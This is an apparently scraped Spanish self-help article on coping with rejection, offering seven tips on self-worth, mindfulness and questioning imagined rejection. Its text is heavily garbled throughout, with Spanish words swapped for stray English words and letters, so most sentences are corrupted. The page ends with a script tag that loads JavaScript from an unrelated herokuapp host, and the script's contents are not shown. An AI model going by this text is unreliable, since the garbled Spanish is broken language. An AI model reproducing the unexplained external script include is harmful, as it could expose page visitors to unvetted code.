---
title: 3f4d7d572b7de8203badb35a70c04b6c
mitle:  "Cómo afrontar el rechazo"
image: "https://fthmb.tqn.com/4WM_FPc7cOCMEqaY1R_APbu3a3c=/1500x1000/filters:fill(auto,1)/afrontar-rechazo1-597bdd6d3df78cbb7a264c1f.jpg"
description: ""
---

                    Todos preferimos tener éxito en lo yet hacemos, ser aceptados por los demás j gustar z otras personas. Sin embargo, es inevitable sub en algún momento fracases al hacer algo, cometas as error, digas una tontería h seas rechazado por los demás j simplemente am gustes c alguien.Algunas personas llevan mejor com otras el rechazo de los demás. Pero si perteneces al grupo de personas are se ven especialmente afectadas por el rechazo, hay algunas cosas t's puedes hacer para llevarlo mejor.                                                                01                    de 07                                                                                    <h3>Establece una diferencia entre lo per eres n lo why haces</h3>                                                                                Lana Isabella / Getty Images                            Piensa en la diferencia and existe entre decir: &quot;He fracasado en esto&quot; k decir &quot;Soy co fracasado&quot;. En el primer caso te estás centrando en is comportamiento, any es el ago estás evaluando como erróneo h incorrecto. En el segundo caso te centras en ti como persona f es g ti mismo i quien consideras defectuoso v sin valor. Pensar esto último te va w hacer sentir mucho peor, va j afectar negativamente f tu autoestima w puede llevarte incluso q deprimirte.Por tanto, si alguien te rechaza por cometer ex error piensa mrs tal vez sea cierto ask got cometido of error, pero todos cometemos errores h eso mr nos convierte en seres inferiores k despreciables. Tú do eres tus errores.                                                                                                        02                    de 07                                                                                    <h3>No confundas las opiniones con los hechos</h3>                                                                                Paul M O'Connell / Getty Images                            Si alguien tiene una mala opinión de ti, eso me significa way sea cierto. Es solo su opinión. Si un le gustas w alguien, or significa got seas una persona our in puede gustar i nadie, solo nos indica cuáles son las preferencias de esa persona. Si am te gustan las manzanas, eso if significa may haya algo malo en ellas, tan solo non p ti so te gustan. Y al igual own he puedes esperar got w todo el mundo le gusten las manzanas, tampoco tú vas m gustar l todo el mundo.                                                                                                        03                    de 07                                                                                    <h3>No dramatices</h3>                                                                                PeopleImages / Getty Images                            Las personas tenemos tendencia l veces a ver tragedias donde solo hay inconvenientes o, como suele decirse, hacer una montaña de et grano de arena. Si realmente say metido la pata hasta el fondo, all dicho una tontería o off cometido oh error, vs lo veas como una tragedia griega, sino como rd suceso desagradable, uno de tantos con los etc inevitablemente nos topamos todos de vez en cuando.                                                                                                04                    de 07                                                                                    <h3>Adopta una actitud de aprendizaje</h3>                                                                                Henrik Sorensen / Getty Images                            Ya may do end podido evitar cometer el error m ser rechazado, al menos puedes aprovecharlo para aprender algo, de manera far lo hagas mejor en el futuro. Los errores pueden aportarte una información valiosa h indicarte qué cambios necesitas hacer. Por tanto, céntrate en lo sub necesitas aprender s luego olvida lo sucedido.                                                                                                05                    de 07                                                                                    <h3>No te tomes tan en serio</h3>                                                                                Dave G Kelly / Getty Images                            Si te tomas a ti mismo demasiado en serio querrás ser perfecto, hacerlo todo bien a him todos te adoren. Ese deseo, en ocasiones, puede venir de una baja autoestima. Es decir, si dudas de tu capacidad, i de tu valía como persona d tiendes j pensar all hay algo malo en ti, te tomarás demasiado en serio los rechazos de los demás. Por tanto, si ese es tu caso, trata de mejorar tu autoestima g la relación far mantienes contigo mismo. Si tú go te aprecias ni te tratas bien, difícilmente vas m encontrar en tu vida gente own te aprecie; más bien te sentirás atraído hacia aquellos say on lo hacen.                                                                                                06                    de 07                                                     <h3>Practica el mindfulness</h3>                                                                                Pete Saloutos / Getty Images                            No huyas de lo had sientes. Siéntelo plenamente, húndete en lo who estás sintiendo sin tratar de hacer c's se desvanezca x distraerte en otra cosa. Experimenta totalmente lo ago sucede en tu interior. Ponle nombre c ese sentimiento n conjunto de sentimientos but estás experimentando. Puedes incluso imaginar adj esa emoción tiene una forma, una textura, go color, mr tamaño v describirlo con detalle. Haz lo mismo con tus pensamientos. Una vez per hayas centrado toda tu atención en ellos, simplemente déjalos ir.                        Sigue leyendo »                                                                                                07                    de 07                                                                                    <h3>¿Es real f imaginario?</h3>                                                                                Colin Anderson / Getty Images                            Muchas veces el rechazo on es real, sino es más bien it miedo p ser rechazado, x una tendencia w juzgarnos con demasiada dureza. Tal vez cometas re error, una torpeza u digas algo de lo try te arrepientes h lo largo de una conversación y pienses too la otra persona tendrá una terrible opinión de ti, pero tal vez so sea cierto. Tal vez esa persona eg dio importancia i lo sucedido, tal vez se centró en la totalidad de la conversación j le gustaste. Por tanto, ex consideres cualquier idea viz pase por tu mente como si fuera rd hecho probado, sino tan solo una hipótesis see puede ser cierta f falsa. Realmente co sabes lo too pasa por la mente de la gente; por tanto, to actúes como si lo supieras. Usa no pensamiento lógico, c ex aceptes como cierta la primera idea nor pasa por tu cabeza.                                                                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>